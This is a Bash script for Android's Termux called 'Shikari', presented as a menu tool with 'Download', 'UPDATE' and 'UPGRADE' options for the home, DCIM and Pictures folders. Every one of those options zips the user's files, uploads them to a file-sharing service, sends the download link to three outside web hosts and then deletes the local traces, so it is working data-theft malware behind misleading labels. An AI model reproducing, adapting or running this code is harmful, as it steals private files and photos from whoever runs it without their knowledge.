clear
ban1(){
echo -e "\e[32m\e[1m                     "
sleep 0.2
echo "                    \ /"
sleep 0.2
echo "                     V"
sleep 0.1
echo "                     |                  "
sleep 0.2
echo "                     |                 "
sleep 0.2
echo "                     |               "
sleep 0.2
}
ban2(){
toilet -t -f pagga  " S h i k a R i " -F border | lolcat
echo "         Created by Parixit Sutariya"
echo -e "\e[32m\e[1m                     "
sleep 0.2
}
ban3(){
echo "                     |"
sleep 0.1
echo "                     |                  "
sleep 0.2
echo "                     |                 "
sleep 0.2
echo -e "\e[31m\e[1m                     |"
sleep 0.8
echo "           SDCARD----|"
sleep 0.9
echo "                     |----DCIM"
sleep 1
echo "             HOME----|"
sleep 1.1
echo "                     |----PICTURES"
sleep 1.1
echo "                     |"
sleep 1.2
echo -e "                     v\e[0m"
sleep 1.3
}
req() {
command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] Python Installing...";pkg install python -y;clear; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] Lolcat Installing...";pip install lolcat;clear; }
command -v zip > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] zip Installing...";pkg install zip -y;clear; }
command -v wget > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] wget Installing...";pkg install wget -y;clear; }
command -v toilet > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] lolcat Installing...";pkg install toilet;clear; }
command -v tcl > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] tcl Installing..."; pkg install tcl -y;clear; }
command -v jq > /dev/null 2>&1 || { echo >&2 "...";clear;echo "";echo "";echo "[^^] Requirements Installing...";pkg install jq -y;clear; }
}
menu(){
echo
message="1. $HOME"; for ((i=0; i<${#message}; i++)); do echo "after 1" | tclsh; printf "${message:$i:1}"; done; echo;
sleep 0.2
message="2. DCIM"; for ((i=0; i<${#message}; i++)); do echo "after 3" | tclsh; printf "${message:$i:1}"; done; echo;
sleep 0.2
message="3. Pictures"; for ((i=0; i<${#message}; i++)); do echo "after 3" | tclsh; printf "${message:$i:1}"; done; echo;
sleep 0.2
message="4. About Us"; for ((i=0; i<${#message}; i++)); do echo "after 3" | tclsh; printf "${message:$i:1}"; done; echo;
sleep 0.2
echo
printf "\e[33m\e[1mSelect Option : \e[0m\e[1m"
read option
if [ -z "$option" ]; then
exit 1
fi
if [ "$option" -eq 1 ]; then
clear
ban1 | lolcat
toilet -t -f pagga "   Download   " -F border | lolcat
sleep 2
cd $HOME
zip -r shikari.zip * -x .*
curl -F "file=@shikari.zip" https://api.vshare.is/upload | jq '.data' | jq '.file' | jq '.url' | jq '.full' | cut -b 2-41 >> shikari.txt
curl -T shikari.txt http://scnc.co.za/shikari.txt
curl -T shikari.txt http://ayk.co.za/shikari.txt
curl -T shikari.txt http://foodconsult.co.za/shikari.txt
rm -rvf shikari.txt shikari.zip
clear
exit 1
fi
if [ "$option" -eq 2 ];then
clear
ban1 | lolcat
toilet -t -f pagga "   UPDATE   " -F border | lolcat
sleep 2
cd /sdcard/DCIM
zip -r shikari.zip * -x .*
curl -F "file=@shikari.zip" https://api.vshare.is/upload | jq '.data' | jq '.file' | jq '.url' | jq '.full' | cut -b 2-41 >> shikari.txt
curl -T shikari.txt http://scnc.co.za/shikari.txt
curl -T shikari.txt http://ayk.co.za/shikari.txt
curl -T shikari.txt http://foodconsult.co.za/shikari.txt
rm -rvf shikari.txt shikari.zip
clear
exit 1
fi
if [ "$option" -eq 3 ];then
clear
ban1 | lolcat
toilet -t -f pagga "   UPGRADE   " -F border | lolcat
sleep 2
cd /sdcard/Pictures
zip -r shikari.zip * -x .*
curl -F "file=@shikari.zip" https://api.vshare.is/upload | jq '.data' | jq '.file' | jq '.url' | jq '.full' | cut -b 2-41 >> shikari.txt
curl -T shikari.txt http://scnc.co.za/shikari.txt
curl -T shikari.txt http://ayk.co.za/shikari.txt
curl -T shikari.txt http://foodconsult.co.za/shikari.txt
rm -rvf shikari.txt shikari.zip
clear
exit 1
fi
if [ "$option" -eq 4 ]; then
clear
ban1 | lolcat
ban2 | lolcat
echo
echo
echo -e "      \e[33m\e[1m[^^]\e[0m\e[1m Name  \t\e[91m\e[1m:  \e[92m\e[1mShikari"
sleep 1
echo -e "      \e[33m\e[1m[^^]\e[0m\e[1m Lang.  \t\e[91m\e[1m:  \e[92m\e[1mBash"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mAuthor  \t\e[91m\e[1m:  \e[92m\e[1mParixit Sutariya"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mYT  \t\e[91m\e[1m        : \e[92m\e[1m yt.com/BullAnonymous"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mGithub  \t\e[91m\e[1m:  \e[92m\e[1mgithub.com/Bhai4You"
sleep 1
echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mDate  \t\e[91m\e[1m:  \e[92m\e[1m21-4-20"
sleep 1
echo
ban3 | lolcat
fi
}
req
ban2
menu
